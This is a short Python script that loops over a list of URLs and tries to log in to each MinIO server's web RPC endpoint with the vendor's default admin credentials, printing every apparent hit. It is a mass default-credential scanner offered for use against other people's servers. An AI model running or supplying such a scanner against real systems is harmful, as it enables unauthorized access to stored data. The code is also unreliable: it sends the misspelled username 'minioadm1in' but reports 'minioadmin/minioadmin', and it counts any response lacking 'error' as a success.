import requests
import json


def send(url):
    try:
        form_data = {"id":1,"jsonrpc":"2.0","params":{"username":"minioadm1in","password":"minioadmin"},"method":"web.Login"}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
            'Content-Type':'application/json'
        }
        response = requests.post(url,data=json.dumps(form_data),headers = headers,timeout=10)
        if "error" in response.text:
            pass
        else:
            print("[+]success    "+url+"       minioadmin/minioadmin")
    except:
        pass

if __name__ == "__main__":
    for line in open('urls.txt'):
        send(line.replace('\n','')+"/minio/webrpc")
